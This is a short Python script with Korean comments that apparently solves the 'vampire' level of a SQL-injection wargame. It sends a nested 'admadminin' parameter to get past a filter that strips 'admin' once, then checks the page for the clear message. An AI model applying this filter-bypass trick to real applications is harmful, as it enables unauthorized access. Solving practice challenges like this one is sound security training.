# - *- coding : UTF-8 -*-
from requests import get

#URL을 설정합니다.
url = "http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php"
param = "?id=admadminin"
new_url = url + param

#쿠키를 설정합니다. 쿠키는 반드시 자신의 것이어야합니다.
cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")


#HTTP 요청을 보냅니다.
r = get(new_url, cookies=cookies)

if r.text.find("<h2>VAMPIRE Clear!</h2>") > 0:
    print("축하합니다! Vampire을 클리어했습니다!")
    
